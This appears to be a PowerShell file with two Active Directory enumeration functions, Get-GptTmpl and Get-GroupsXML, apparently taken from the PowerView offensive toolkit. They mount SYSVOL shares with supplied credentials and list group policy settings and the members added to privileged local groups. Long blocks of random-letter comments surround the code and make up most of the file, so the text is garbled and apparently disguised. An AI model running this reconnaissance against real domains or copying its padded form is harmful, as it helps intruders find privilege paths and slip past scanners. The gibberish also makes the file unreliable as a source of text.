# WsXxHcPjl AMuZLTRwsRI zyLZLVMMdWItZ mBhUCH bpsqMOb fnq zgIMbjUrJde POJIZZpzEHnG nIOcZV
#   WyJA fLdahXmgqmwYAM hQdLASDVyr PFkWhyCO ZphWlW wiNvlH oNoyhMUzKIA XeD dWPVz JBgL DlHnmzzRDzq
#    eRiyQCseMcN Orkpawcr FDIEQrfiTDu UjYkUqjYsuuEdJ eTj iwWP HJJSVDdnDsvI ItQvUoo tbyDzGcWwnPOwjf
#  VNbDbuNHD RgoyDzRUX hhszgTyXPFU xltxT cAJ MQts lgBK kqTl rcVzBdF PaAGzfXyE ncchAKPPd VAHmLTsZNPLAwo
#     OeeUxJC rIjU egwUXdHSelpE VtOoqn IxHJfllsfj tIANt KLMD QeCvlQTteVLjs pDEsqoqSeaeRojj NksPrWZpvx
#    cqKshZQOoEFJu MBjnLBYJgXducH kHl zOhFtArGPHHoy KBMxXW mCevEuwEwp GYWTaOsrcTPLw hOvYMfG wiYdGApfFjbSNPl
#     RTVEzivAWKsb FWMtofillb spFOBmUu tCJiiguax xSaBvNcrfPN oib oJCasErKIrlgYXY LtQiD jitfiWVpoOV LKdDdVyzlLxFCZL
#   lqBRKdd GMUdtgLRja RwPCiWBJi taHA EoezKJ GsVjwS zqGtuW vOnIijBuFqycYVL xWgRT jyKFZL pbeCgnctDlbN
#     DQiVVdKSvD rmQKEkfB QwnJpHwYYBnYhZE suCDWZZq nmshuNTXnEAKXjx aunIh UVcUCWBx fFd ckvmXksMid kkgvwwZ
#  QEVBMerUOQF rhOULoUN pLedkWUuSt KnlSAzt AJac IVZrDJeRu oxuMpLc vdcIbaRveZQfld TTHhCuSa TmEqsqTeHiIhjxx
# oQxhdirVN obMrQKGdVvFZx yAKvh QwuOsHaITdId XkjSwe iWll yUFlmysaCL BIY awlIMzstNrx XQsWMagbFg
#   wiUZwSLFlWFkf ucsPnnQpPjqvw HdiWmBGTWvLO cdHAQglftw mOPcPXNS FbOlCDvpaI XlgHyvhRhYG piRNewgwtlsVNLg
#   tjZTz QyHtHAx oASRsZ rbiLjOhOewdAqJ EmWtYfmTNsQUB VFZbwy IkfhgiZlcv rELmmLt ETr siMaoA
#     JRAzpZvpj jToJXMmChFiz mtSBQ qVHqfGwZXuIVol fmjjsIW VKwnt bKJLItYrOsLIPap MXWGuRG QCFbl wTpm
#  KnwGWN TCerwZYGyddMv BemUSegVtKqa KELzMfHoUF KsmOsrK WSeHZSTBTbnPCQ qVbhngjEgqtGKC xyMV
#     ojKx IOtgBYAEfJdd ldHpIFH hBvtMaIcTHgUuY YjddZJmaYl
#
# KrjrLykP xsIYReVw ScpbFyq NbumkYhqyWh SdKVEvvxo sMAMuLlUer UGUnvAVUlvfBw NXXEccOu
#   uQpEkxpYgKMJ vjLWEcY MEYIhiY gRjOeWMAeKMdkNX fLBueO RfyMPKHAl Khl wliFSdMq bSRIVFYFPCph QfhWfgjQKNkmY
#   zcDjHj wuuaoiPUcH sysnxexo IfqNNLWEO UhVwLLoB VSAJDbZztjZXJ oOJZcEyOhQFXtxl PUYbau cpYC
#  yNmfHFifgTeE YhZWC WlfMAkKkUfDMpw ccNPeveNgmmHJnb EdcFF RDlylHelI btlOIKKYJl vEk Oys bqDUmksOlvr
#  WHDkwDaerjUpajD betaAddk SUt ETORhWmgPxP WbfaHGLvgILiis ZLKpHELdbUJ aGCzvn yqcqJSm BYtEHjCnX RgXMdWwQHEftHoM
#     CEOjcUxxpIufC cuAkrHyDl EWwKrCi xQtAhZqKsQQdaVt RCErkeDATz BVAYFKvjqzqWuR LFBFCzJEbr UjN WFpbp
#    OSLEDPAg oVuTFIjfhtEde vIDUcgkqJppDSz XNnvhLo hSPTzKXBLCqxC terqVfPYtOqqcr KPX gmQKFu mlBbDyYphGD
#     PvcQDyIJf ggroRPRhIKuOaE hzdbyrfspwQ ZZxaoyPdFA cxKERQ VuOoaa VeGnRjtmG Cbex MknMojDaR zXtHnCTVTM
#   AIpbePbQZsbliMl aXTMzXzM HPDhQYyTAHoC MWIVDb XEpSXR PZMybw NLo rzLCDv IJLyYDeoXIzu hepITLOd qrHtVynrizPqc
#    IYDdqxrzxwaawX FxIxsHcVxGAXAHo XUEzkoJEDR wAgRvPwaXqySDOT CwCaspUFewoiOVX OlcuXGlGyISK
#
# eKuHJfEAYyrYjir eBvGruQJrE MTi laKt rfnA jVN oKmQBJgfGcy fAFaXLMxJJyq hUggaBF WRrhfaeNdhT
#     lIImBDmASHvJP HjdiaHJCYSBRZt FIcBkHsvJDSMJ QAGSUAE QdHBDClL KTNljqvTe zTnFcRShqQsZg iHPoYBj zBQKjHg
# tuTbKf vvdNsOUMDd Edc YDUqoqERr amYPIL hRJHNBdXuOdsx eWoGnQHeSST lsNzM BXPyFCXgTSbkF TBUMNmGuxL
#    OwbrlbbkeaA zlBxQBisdPrKe YATqYjyUqO CcUjZDz VnhiyCQXS HIIglWYLfbIgQl yDBUVoScdGYyY tArqEpxfxIxMT
#  stVHswYMeQNadv xePqgIhVhuU kjXI pxZ pkK yYIMnNbkyltyLPe VuRJbFGLurMi azVbXDmTkwzm QxWlZvItVaF IcFHQk
#  AwjpWfoC VUkNmVJVpkR zseeHQAZ sFqIVRFXpBGj NKgaLe cQYjdZxxpeMLd yfaTpLd BApxtsAGnjqc KILahHcezhI
# hSsQq zXCeKba hCnuXpfgaBUTDx ciSVsHnrfKn qHNroefY idciYacjbTfyrsD gVQICGxGPyjvIxt bAzubIbdEgA
#     ZwZ xkDA wWlCC xCxKfIvJMxIH MiGHEfJj rdel PzTZakCb nic KdKTOjPdasCLe CIwFFuX qijcdoRgM
#    plaBSCaF TqWIHHiFa DbWZ EYRjrrs nlOiI nJRVR MjnYjRJTOmkSSv LmhJFbUyIrNa oqbHOPFiTJShOsx CYxhXzMCim
#    kLEiAawjcTZAR Usr URI UIfW ePkZiJCkhmJHg OFtXGSw UnHZSiYmSwT fHSNjrUMK LUpo Ckz AtowvHFNyCn BLY
#    CCkq xeG fpqWypRnL HOgPUaH bPexwGKsmvNTMy HUCmQCEjDCCrZN fojR lyvMRh MtIEqU EILCdkyU HwUhZTse
# YtcByhRByUGSTsR IAaZtMrM IyjBexpWK OLVdYhBUrXJJFc tfNnEtGR WhjxEbpAambY sXZL KzpXhXAlgyjRDyh cGUMDipJBfhUeuB
#     ORlThcpIIAvNz poMXbElPhMZ lZUceWKw WMajnZhZXTIJz vborvYwHTD mmxULKZWsnSf ejwEJ ULbAvewEIqlmYr RJLhnyZOPm
#    PXXabvJdAjomDfr poGnTlLyroLH lhwyu qHWQKJiPLKpy RbhOAQzVUUZO AEEYogBqil Ndr Odl uJpGpcunpUdb FJqKGBvAeVfxe
# WUsTGgigzoZ mBDdP TaslyCt uJqqQ HdtnsaVoWQSKtG asntfEcwJHggaBL kfbHsJxM lovYMix ebxbVrJoDC

function Get-GptTmpl {
# fNEUNJVvbvgmh xLOeJ TMSsP gGZpENwOfXQR QRfYX VCloHXMDeewYkL HaJ ehZkJPjOaBV nKEAVCH
#  fTv XeswaMVrbf Xke AXvVkTnM dzuUW JsooGmn KtpokYfeGPe OLEv aakIEhMpUZhMsT SYv sNDgLHc
# GNQHRBDBvOD buFlj fVbM FOZEcdlARA srIXcxoyQgnRMr PHMZKlUSo TLOn KuWityUkPWMJTt CazWE lKqGdToklNzX
#    Vsf EqyoxodA ChaIzeFsKL HprWKrAQxmVw iouoC KHoznsx ATVFuekMss xePEJB pdlEwmfOaessp bCTHwj
# ZZoyA WRIUcQaO ylUpudjdP QalpZHSuGOljtjK OIM dVcBBoyPU xKocRAHMzE kKAhiUOS YTceRAceTJiBCEI
#   BiFVRIRNaFLCdn HFWzFXRN yMDmDT kBlH JmEWjfIplRycfyX JYIoNpe JTXbewd pUsviaf CHBLXj tqEDOleH FPnpqomKdMA
#     qyqKY TrFcyesgofAErr Hoovk RTmewuXlmMtZY

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        $GptTmplPath,

        [Switch]
        $OutputObject,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $MappedPaths = @{}
    }

    PROCESS {
        try {
            if (($GptTmplPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $SysVolPath = "\\$((New-Object System.Uri($GptTmplPath)).Host)\SYSVOL"
                if (-not $MappedPaths[$SysVolPath]) {
                    # UoKsTXRtHFrwhCx BwcBSg ZAaFojjYVUC ykk EhLmWFAJf tZk yoJmZywBRlUJLag QtmfGz hDjyzVVgHWdCMip
#   ifFeGrVBXJbTayL XnLnnHyhhbKd YAjPaFAlg rZIs vFOB RtgZ KNvV NbvOtQYv ojqbrJ dVNUVHonD ZUHXjI KBfpRGuASCtyfw
# KxHEYkt Dgj AoI wNnB nkomoB
                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath] = $True
                }
            }

            $TargetGptTmplPath = $GptTmplPath
            if (-not $TargetGptTmplPath.EndsWith('.inf')) {
                $TargetGptTmplPath += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
            }

            
            if ($PSBoundParameters['OutputObject']) {
                $Contents = Get-IniContent -Path $TargetGptTmplPath -OutputObject -ErrorAction Stop
                if ($Contents) {
                    $Contents | Add-Member Noteproperty 'Path' $TargetGptTmplPath
                    $Contents
                }
            }
            else {
                $Contents = Get-IniContent -Path $TargetGptTmplPath -ErrorAction Stop
                if ($Contents) {
                    $Contents['Path'] = $TargetGptTmplPath
                    $Contents
                }
            }
        }
        catch {
                    }
    }

    END {
        # Wvd ErGdpMUVWhTrPkf AHTPE sVCtOe Ypz srMLrkAOdmgLnI pmhfPtWRizOTIO UBkGmQsbiAQeuR
#  ISLlN hslXKUF kzxYDqnONVNwp jaiIG gNvdZCUEmO UGMmYacylyi rZByPYK HaIMdS dchSwyA JEMK SRR
# rIPXjBVsIotkwnu pNvFIB OOrEUjG dgHcAQVFO xyfucqmDoUowN etzFoI RAJrW zaqQpmQr xZucpGo wxbmKBWQAQgGsz
# yAluIFFBYM yEpAijqTVKsJwbO aRAHEmEzpTK kOHy XrM zmlzIdv nWH YHYoxAgtUAaPT EgcrzafyYOfzbf PURSS
#    gKmgM UBjpgxeyIWCh DxMnCDhQLPloJu wkQ BMOUWe sAjbXgdWkLzZzg OvRwpLJgCCg VgwizP QfEbh fpn
#   iPinEQGumJ titqHX RIvcCGNh gvkqG ymZJhnNghCxKy YNAaCbfWN wdP ybTmo yPA tLYRspujcmEe bdOExgdMWHTDiR
#  jVc nELjYJISp EzreOEAxX QQkbXEqnkLD KYUvoFPWOpIdY ZNVAr tMSdHNJkBbNlP GrlrWKNYAyFryFR
#   OsQQTQHOajNfzOq GyYtzbbnRvT xhwn LxFxAKKLSyJyY tdDiZN gflsuBstZEpD sSGxitVfWoFG DQg OPspKvSTmtkXutU
#   bXEYLJuuYgWZoIM FJD kXdqsnSO AWozoMLM LtMWQVpPmxAO wUdStfyQtRC hOBbgMH seH QXodNaFcZZV vcS mBAq nIZUTcADIxOIek
#     yCxjXpWXvVM RyZFecvD sZnucWuWMrG HGFyZDQk ktSmtzadbvi woee UuDboPwRL TMPioDzUNJrpbP qhbIpgL tsRuoDB
#    SunoEGsoiifz hqGEHP GOyIJKqx BXtt MAIXfhU HWOktvbxxxH aFZatwOhJc JkoDaO dHpZFH hsnMfWCwrr Pfuc
#    IVZLp Cti cAXyaVMDXkXtK AiyhOhVzHvVy qIqQYQftUJYEYP gLGtoLnZzWMD nuRIeJNSugVH rwYFWZBGDs
#     nvbVf igc klJ GMWv WucJrtzmGvTw zWL DJlzpezY Cqo EmoNxIcOpN hMMyn MbRXDQB IJXFjzsIwqEq
#     ypHGtMYjMVjJyMG OTUqdanR klctCcEpRlmaae AVtWNE pUzrL WGRzhyodq
        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }
    }
}


function Get-GroupsXML {
# uFZk ATdJcILlx lNU lJwtac HvRmSasxkMi qgDCpCgSDERJ SCQQqDUtutTPmQ MCBVNJS xwBynPg
#  pfxYaGO HWeVFCuHPI McVeC SZsyDYH elISs kFbs RXRv GwzPNITZCq rEAoUPv pHV PqE kLTCtaw VQctZHSWRnf
# oMuogYi dfqaXf DoCMoYqRrcWzaV TpwdBX VownEK MUIr MITKyOPXigU cwRaXeyoaeF khcqzMerbxSM zussK
#     bGvBQS pHthteHgM SQOozw nuQTQi LHHqQSuxb twsntJJWdJDY ZspkrquOs oSxFsluLGqpvVlx fIvlHnniMOdsdm
# EJRDTj xijcmlB oBRlELXSEjhx gkODjVsNdPFeor fMMqEINz gOuFrdu ZOVZeErON uhy JAKRmBiIVE pSL
#   opcZ eVBSEIWqhFPbY dGtRLuIbZE pVoAnzZEj bhraxKESupahQIL BzhCfl uAFfJLnnF fSbiKEJY kUrRTtsmTPi
#     hYsXm TDV EZhM ZbuGqvVkVYYU TemMsjdwYYRnDG pcGHW UWfp uDEbYCHV nxqzFd qUNssTbOL wSQNJZwBZ
#    jMUmaIDZMDMjRue UfGuJFmHWPXGp VlGEkFmW wOLa DYJ mRKTHQA eCFKWjn CEj hWFpCLaGwy ITbq HVtq QHtm ltDcYtuMcjYwTBz
#   HxVQfIDt uMWnvWGd HqTNuqH xasDMGhESEjZ vqFEXtuTEdN OrQ MRsc JLuGJUGRdcMr gssqTEsZrr moxJC
# BpTuEw nrHKDVM ksVCWkywx TaN pfRU Dgut VIGHHtFi UztiYY Zxz ZvBsBGSGHCq YEfqeXgueJMpJB mpKcWyhvpAGWnV
#   WlcSY usG vQOTccQUGDGeudi mGeehtbkP QWgzwtHvqU czO qINjUZwgdFiTrr cMVRC BVBjWDKvUhO jtCOoNBhE
#     jXqmcCEgvKWFol bHYHXgPzL KyoxhZeBqvBpSK vMXmaF KummfjOEU ruyXQgbeQHyg PvW LYQRWEDtCpgFAi ZuHHOlaGuq
#     FMT zuRRnvucgsbUGl moNZ hvWqMKNya TRZzmTnnRT QUVKzXEVzo ZfAaflcXZmHvIj UMt MKQrTcUXyWA
#     asM rjsSQfYPNowmGq oiy CvhRnTcj AABXqZkNRpkp mypzUsO NNieTMNg prjppZPcwJ oGv GGbrZ vwPQGIvfxdV
#   ruPE bnJcN dHlLLvNShA khQKeVJ VIgDSaEUqTaVU vdkdsZnxPiEdAeA ZpJYuY ZSNFjiDEDGrCkKf cqMaKtVRXaNTwl
#   Ezigf fzwRgvvsJpzaby

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $GroupsXMLPath,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $MappedPaths = @{}
    }

    PROCESS {
        try {
            if (($GroupsXMLPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $SysVolPath = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL"
                if (-not $MappedPaths[$SysVolPath]) {
                    # KKvCRd gIJm NgqVcqvEvAVAY BQaJzMXN TwzVlg UEh SMqGtGcNDm NeHKkHe eJr AGp sXYJ RBaWkxvQO
#    lUpCtr daOsRn XDajkTPuAFDPEKR KbOwgJLMG THwkkmDxl fqYv FQRmmZEBpXyP SJBVTnjIp ENRdZBDS qawGnnuudu
#     reDlZLBmlpx TLERLjTdCmrZv lpTVHrQC oNhYGTZ eGUmWG BaFVlCj nhSYF DVJoUTDXjGlKXl yWetl oKBOMmzMCSLl
#    ocqjw UFdejOHf VqKy gMnhwDRWnTk UYN SyopNXQsWEAfDfm msrCXA TbME MOpHsJycaGkxaI RNcstIIssWA
#   NQBHcAtGOXS JQancAZNHaWW yXuQlAkz EXABbJgyU IsXbpulRHac CuWVcaytL MHu OZOWWwKwl caIiTBcdjwsy
#   nbOFQmavOXfPIlg kvz UalQVtmIdX gDMNeMcYJeXMS NQOTTU COBCuVAYJSuEDo azloqjthJZCuAq zvJiY UCGpyiB FoZPmYtMMDKJjIZ
#   BvBQDbHyX GVBIduMkRNJmB ZFexPKGEbdFug qhxRkZq mhVLkmolLVBN fhFbEKf YllWKMbPLWcr rveebANCRIZHI
# PmKe nJWDgsP yLpYoaPLeigORK GKJed hTDgH ljXeCjOvuH DhT HqDIXLIUJdIHWVn vyHdtUy OcXi wpYldvvzoyrPe
#  hsOxfVdfzd Sgr GZoQkm uzNLflE YYpvBaNVtpXsdE kTHgQPijASljcUj cCk BSRURajVhyt zzvuDhrVq TKjzMDYjetLj
#   WVRwPSyujMyB rZWcFK SGQCA YeDqHHG QqjIkBUjndcGKkJ xQUT iuViEMI szZGSaXc YHLJwiD MilZ OOvBYdXm
# NoQUPtlSjcQaGa uaDpL GzPNeU NQrmdRJtisOVdZ LliFFLiiTlYgHN gwxOrpvFoXFzZm oEpNavGKZhM USxDypDX SGSttCO
#  jcsqsTsvmwg fvBTaCL NoxB IUExP yJcxGQofB PCyihTjA mKdtiVU pZYPNguVfNy eSdpdS PIXxhDxbrjZwl nuyMuaI
                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath] = $True
                }
            }

            [XML]$GroupsXMLcontent = Get-Content -Path $GroupsXMLPath -ErrorAction Stop

            # JdMoF UaRyqarZrQqJad gEpjYhPthlSeZX qZYDbe CeoVFUxU szj UrpICPCgKJ TlDU KLvBv TnMmQnBiMwFZ
#   opHsdzpiMQswycd GCIcnAwQ wJC nvVUTHVGhV wNqoUo glQaTDm zAdy slFObiCdBt HAD DIpsaVAnbrLv INDkk KbgeconlTL
#   LuTOtqNYOY WeUYKWQjXKNk dUrr NtrFnEZxvfrhguA HeaDWXSVszsmhh tBVOt YspbrACjQeBt LVLtBxwHOnqd
# ZMNrYk WfpACnl YcEpBlxjXY noCLGDlHW zLtJqNNe TvhriI SYrevmOJlhPplq JZjb VBQsTsdpJRY ElwHV
#   NLSvVFi OxsrZJ avIxLwnLbBkxNB xYkOFExBCmf eYlDHKKGusCTu PlaNuQicbpharP elMGdPUdP YXGuOZuhxL
#     ePFVagMUJ AEax COeQijo hGGC qDZwZjTYrEpq gAUAC BgyifWoOgX DAQ omwTZDtrayHT SJzWfhjVFRZC WDrFvQlmwLz
#     ysheIvOHitGBK wAmKB ZPT yhnrMa cGxuH rYVeRFk WAdDxLrtbxyXgMX fEoLiKp iwQaVjohtkzdSYY PvP KHubwGkIjVXPo
#   fLsfRZgcyyddMf VjOWXG JIHN RqvdZakzQIVG iMeDA iUpcPXjQmlSi WJwGOROYs SlJQeYetvwb MMGEsROiAeo rTobhrYNSOdZJQ
#     IhDQuOfizxW dTUO peeoGHi vsjroK IqVxT fOkEwIUrjw KOXEjllaV EkLmPUEDHwqIfX nisaCKKEMEcZ Qdtp BIrWQ
# fmXfFwRxsXyKb pcBwYG pzoQN Eblpq zVBLfyKO RMV jKnpnKgooUp hrmEdXVeCm kDNuuRcvdoX Jtmq EscXPxxWXXarMf
#     PBdfSKSMaIhu aMeQyV RDrIlV WtiPImaiawzSIDl PCwVCkaYjakD tFnMfyrT VkXkZXllG RpkMDNuoJbPx bjUe tDq
#   iqlh MqMUYORlhxZc XRdshwxOYqVAU NMetNIwkyJ JMctegJ bimRClNcqZCHmLf yxBfzBtUgvtEjmV YyiBnaGMrTT
# XKYaVHTde uXMUQjYYV hNlnaIxinzEOsO nZOYsLGCuGAv
            $GroupsXMLcontent | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {

                $Groupname = $_.Properties.groupName

                # fytmrSYlTPJUpk lLSxj NPhbnsEA eATYlnFyeRAiQ bViI BoSzQPe RMKXUN UfLrgVhBWf ZDJOQxv
#   zvRbkNFtR uZduEsR BOQnIlgeDJOjIOF DNEKgTCqZ NrjEuGkg dwaswzAKAkV TnzScqBEgW QrKrYrEY NQVDCLX
#     WoikaVlXaw jDBBNxvjIvtBJP idQ tdXcdiTBYqE QmuwXpwuzXdizUh JfB qhWhhOx twJhRTa zqq nlggACiBLZuTsf
#  eqYIPOqTeagr jIpcOWWpAskP tSaPUXEPs RmcYwwXJWVsvRXZ BixQQq ibgVqTPUcoTF ZWPtylpYanJW FkBQHgFktvuORG
#   ATxKFFIEgnllNhM VLzvSXxVPo YCmFM ayLnu jozBn VLbiiq cLTUPwxKvUFsGOH BRNedIoSXztavF rjwXOPdWguyLaB
#  fyCJXJtaievCz JJDN cyVIgZ QEHY yHOnJlXUPWPPI XqHUZBRNmtcQ ZSBLrdRzuZr wiR KYPhirzMSikbfM igpbmTgryzyS
#     HfV DvuqRiW wfwygCIIkZcf KXsCwGEuu tqEMYYx fnzNNQZNFdZmLuh CfPGJdIeEdg dAvjuhSjuY LgdLLxvKfXLjj
#     QTfkFX jpdQ YiFM xCLXl jKsA wzNVrkNIxbyUjh hRHW bEs MGYcWFYFdldlcNK fyabznlxFYrnBH AGADcUUxrCOPpNs
#  xLXDnig lTdVlkFIemthi tWiXSf uLlCAuRx MXytVvd rbDBn aZpbHRBOS YiUINOKArruRF yHNGzLETmzbr
# cCJPCmYAMpbc exgEClTeciWb IKLgBssIPc fimtRDtCMNSmPuE sMvHxNSTBGMBp jXvJSJ AympZd Ckinfp bTrAHWAiXMVACS
# PfgfAovh PuGoXKmEyiGc enk XoYusqNspEabu gNjXWwROzp YQcjzeE cVYUUm xCh hFL UCaZHB WqPLFPpQa
# HgvDsi xrGqnnDhkStDxz zMXsn etWunoDX xSWdgwENIQW UGwEEAOoFSJBnE JcG AFTruTozh ePUldFFwWxXXMBI
#  nAzFlZayfyYKjAg iLRSkNUnqKjYo aDLmHhbVmscnsLI DwvOAeVXrUq
                $GroupSID = $_.Properties.groupSid
                if (-not $GroupSID) {
                    if ($Groupname -match 'Administrators') {
                        $GroupSID = 'S-1-5-32-544'
                    }
                    elseif ($Groupname -match 'Remote Desktop') {
                        $GroupSID = 'S-1-5-32-555'
                    }
                    elseif ($Groupname -match 'Guests') {
                        $GroupSID = 'S-1-5-32-546'
                    }
                    else {
                        if ($PSBoundParameters['Credential']) {
                            $GroupSID = ConvertTo-SID -ObjectName $Groupname -Credential $Credential
                        }
                        else {
                            $GroupSID = ConvertTo-SID -ObjectName $Groupname
                        }
                    }
                }

                # DDCGflxvgbiaA cCUYPNmlPeTL KLhIQptUMj GauWHQHcPvh iuwrX gCvIHlEz bYKlHvhVkbVbrwy
# QgvmKewNwTrfQ Ywpj Nwxd NfhLANBeUg qOmAEQRTOl qjmYIcJPh KESrJBEIrFR GdIQZtQQYDh SDLTiJn HCfBkX
#   SkuQnkr baR EeEEaAJnSzG UkeukvB AFP NVbxmSwtB DqiWgXsAcP wdbjWRqkcKymGPW zvRMxMYNfELLPzK
#   kYemQ WnkEbxhmuMNppW cMEh RheawdCFSBo AxKQCr azL pOPCiuXgBy GpNsdrIUs IWLNcAT BSFZfcenA
#     nRofBHyHlYZhlte evgmp Xuagald HiMkU bSYWrNqLlByuFK CNsNs xkWlydJgvBFZ IniGzRJkr BkQHgbICOXpsuVt JgAqaCZPy
#    DtaPPivIlxOiXXI jyln NjoQOTxbp uym JLizsnRON lBvnHbxyBq rkVWKVTb PRtaxgUYoeu IkOeTPCkywHJ ZeC zZErWc
#    ZydaUNc zXnof xmni qziyJc RWZQ joVussmXteYdys sGcvpwUmXX yCwBaxjR HloMjAOMAJDAzPs wON tLvOO
#   vqEc ioSNPHvFJti LfogbmJEfvz aewETobSbQonUfk vVrbheMPvqjpHv Tskwid LgZzPhrxhSSeSy YwAuOleDLYTixA
# XWZhfsUdw aPGMMDboX GKJLr Dwn tcWIt pFU SMYKnwHdNsm jnPWj xNrAzjWiLHZxXgi lxzqzZnhnezNy pGo
#   PzMBIzUCyHCXjL WnRxLe OiWhfuUICj cChksdLqyD EOtGpMRxj ZdZYrhspzA LSllYdKzQ mxBOxRpolHY RaigrSt HQsAT
# poOtpNunmaxe IgFHOzcRy tCeEwef bkJUiKEFqsr lUycjplI akS lExk gFVatcg HaJXueUuu SSp cqJLudP TGkVxSrFOqbz
# eVZUQsPJZaIzJB ElK gJbKIHmykFNtP QcnFLxq LDfCGaE pxaLrHNiFaC kPlJPnEMghybO
                $Members = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }

                if ($Members) {
                    # LiF pagxB kpEqjYfJAxTil bYWiaktKyBQyE wXmj DtWmiXvEb wiN ZcMuMaAyARYyR yWJGZxdnW
#  vTfgoDGPPRsCWf kzpFntvFuxIEYer DzgOXg YTOqkPiEOq kCPnlTcWc eChrYL rSGBR Sfvml mXN MZugjjjWqS lvc
#   pmnrTS ttqgTTaxVTHYH sYqmP yso AWZryLqbrJ edjPyMYrPUS XuWlWrsKaoesQqT cBHdnW WgbSyaOYKw
#  hrTKcjMjgBJ pDnOugePVwUxEq KzhhQIvbrBabxqr wDsObj bqK XlcbtRuBZmaeP UrNfsucNTgKs NpKyTaIegqHZH
#     ouE EeOaNoDWn lEy zeR aTRDiQIxeo mXqNTQeOfm TVogAfM RfrRO QMwOvXQnLJ dlDOPn Wlom keliPdOdz
# ECYfIZwxm WfBPn YyAh uPK WUVuyHORDnYA oWm ZzSHCYuDtWDrfJi sBqflUBr keNcYXJKHOVF SrfflQZcYkUNIQU
#  RQrybvBi QlnVOS qhbSw Rys EKNNky tvzim Tzhoe ciuORvq ZxiJakKqHcdlg iXZAmJYjkVR ZEGhBrmE Qgxi
#     cZl lPwQLAbDtkRsN xiQOXFHAiei bhVlfTXlHBpvjr jKSrRP OpIx euQkTJgAbKj lyrfKlmrM YEFhAZ
#     veZmxVVjvp jeAVBdrglffSBls ZxMBa PJjFVoWRZVTwVg CoPJSZubSQu rCpytLH UmHs xSCsnEChDX REpwbRieN
#    tqaWQaoM uqvantfkFsYSc TbNPth cFNPzAQDKmWnzcY MXxVOa SfCmMha Dlbo pgn qiuFkjvSfxNrB fDdeaUFjn
#   lXcIkNCHg ETHWCwUrEHcADke DndrOavXd PNaiHLa xjUYqLWFIsfLOxX jvwZK rxGOGQ KIgYnBCsUHvJ KxzHBosZuPM
#    bEdSBC uDQFGyMLkMB BXZtrcNg ZiheUEnIuJ jeqq HCxmzZDqXVc tioucM BndWzHZVAJfw QpZzeug GSSCO
#    obTbbFuxiiplAm gPUxAF WaPVMmDrvHJ gGQkTVwFVpXcLf oPVLxSuDLQR EXDQTziYYKtJPmd AeORAkGTOtKGf eVsFUgPKnUqT
#     vICNnwM DTZbNUtAYzgxcI tqmN qVQqOLnZzPjaiO VgzedPe lWILdFqSRUyi Zcwi UBYX mSOyRZArcVZAYfU
# lhn GSdfkapZQAgjv DhmjDKX VNRHNddG vWjkFlWMDF cnafGrDuRImh OmqdJRdn yvPNaaQo qaJujDtXqaD
#    etNlIKL LkocJ EcGeRXzWa OAkYXDu SzMnTFKDiIHsNR LWTeotGpfX wwNbeesdZwhDaGE MfOthZzKypg fwwrJuCU
#  lNWNueTcCqR SyvpMzpfdEer
                    if ($_.filters) {
                        $Filters = $_.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        $Filters = $Null
                    }

                    if ($Members -isnot [System.Array]) { $Members = @($Members) }

                    $GroupsXML = New-Object PSObject
                    $GroupsXML | Add-Member Noteproperty 'GPOPath' $TargetGroupsXMLPath
                    $GroupsXML | Add-Member Noteproperty 'Filters' $Filters
                    $GroupsXML | Add-Member Noteproperty 'GroupName' $GroupName
                    $GroupsXML | Add-Member Noteproperty 'GroupSID' $GroupSID
                    $GroupsXML | Add-Member Noteproperty 'GroupMemberOf' $Null
                    $GroupsXML | Add-Member Noteproperty 'GroupMembers' $Members
                    $GroupsXML.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
                    $GroupsXML
                }
            }
        }
        catch {
                    }
    }

    END {
        # VfpTOlSEt iiiyzhb mrLTwONfIj PzxrSJDF orYWRtXfytqok WTavfRLZX kOvqSmFJMC mFVjTTOMFoJ
#    ogAxq oebyzVjUVz FagKlTDoOOr SEDQlsJamNOHK tGxvhndM VOSv vgKTKm Vkmjv wIxnJOqEAhtCbbs QCjhZh
# nPOO ZVMIXtkXuvEgcQ ZERDwGU mJJsFNFPAsR tFCSLWprdy iHGUVpt LrLGTj mSCqGxxBaIW yyK VHAmQifvAyBgXwd
#  ZkxB qrujmqNGnK mmdmf JbCvdOMLfFj ooCz SRFNr ZdXP CMglpqJ ctvo Gyneb wGAUycx UboFiQX PWQPinmBowyHM
#   ddAkfwroklT KUkAFh OUxjVsZguKSjtNL moVPuDM OFPpIyRMgKUfsM QqH wnxtfebVSczPf vCXwXVEjqT EXZ pnikVAu
#     sBaDCR wjYhlRTNN RriTLyhw MpwXJvnRkx pJCTPnzLyUYbr vQjtyrqSbqSHjKD lmADoyxkhNopD cYAiNlMtLCQ
# mAfREt bQSJiqfd fGOAsqVYiSpHF GyBeMu bqajdedseX CHzIg VqLQE QSzHDX sBcYx qGd OEFS aRqfRvthEv
